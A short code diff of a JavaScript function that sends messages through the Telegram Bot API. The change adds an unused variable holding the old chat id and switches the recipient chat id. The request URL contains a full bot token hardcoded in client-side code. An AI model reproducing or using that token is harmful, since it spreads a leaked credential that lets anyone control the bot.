@@ -31,7 +31,9 @@ html:
 }
 */
 function sendTG(text){
-  $.get("https://api.telegram.org/bot818541918:AAGVXFGPu-iU7DCzTZJJ7I9yDmCSQKESGFQ/sendMessage",{chat_id: "-257808146",text: text,parse_mode:"Markdown"} ,function(data, status){
+ var id = "-257808146";
+ 
+  $.get("https://api.telegram.org/bot818541918:AAGVXFGPu-iU7DCzTZJJ7I9yDmCSQKESGFQ/sendMessage",{chat_id: "415047826",text: text,parse_mode:"Markdown"} ,function(data, status){
     sendTG_N(data,status);
   });
 }
